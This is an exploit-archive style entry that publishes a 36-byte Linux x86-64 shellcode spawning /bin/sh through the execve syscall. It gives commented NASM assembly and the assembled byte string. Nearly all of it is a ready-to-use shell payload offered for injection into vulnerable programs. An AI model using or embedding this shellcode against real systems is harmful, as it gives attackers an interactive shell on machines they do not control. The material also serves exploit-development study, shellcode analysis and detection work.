# Exploit Title: Linux/x86-64 execve("/bin/sh") Shellcode (36 bytes)
# Date: 2025-03-23
# Exploit Author: Sayan Ray [@barebones90]
# Tested on: Linux x86-64
# CVE: N/A

; P0P SH311 execve ("/bin/sh", NULL, NULL)

GLOBAL _start

section .text

_start:
    xor rax, rax
    push rax

    mov r10, 0x68732f6e69622f ; hs/nib/
    push r10

    mov rdi, rsp  ; rdi points to the string "/bin/sh" from the stack
                  ; ( const char *pathname )

    ; Calling execve
    mov rax, 0x3b ; 59 [execve syscall]
    mov rsi, 0    ; NULL ( char *const _Nullable argv[] )
    mov rdx, 0    ; NULL ( char *const _Nullable envp[] )
    syscall

; Shellcode:
; \x48\x31\xc0\x50\x49\xba\x2f\x62\x69\x6e\x2f\x73\x68\x00\x41\x52\x48\x89\xe7\xb8\x3b\x00\x00\x00\xbe\x00\x00\x00\x00\xba\x00\x00\x00\x00\x0f\x05
; [Length] : 36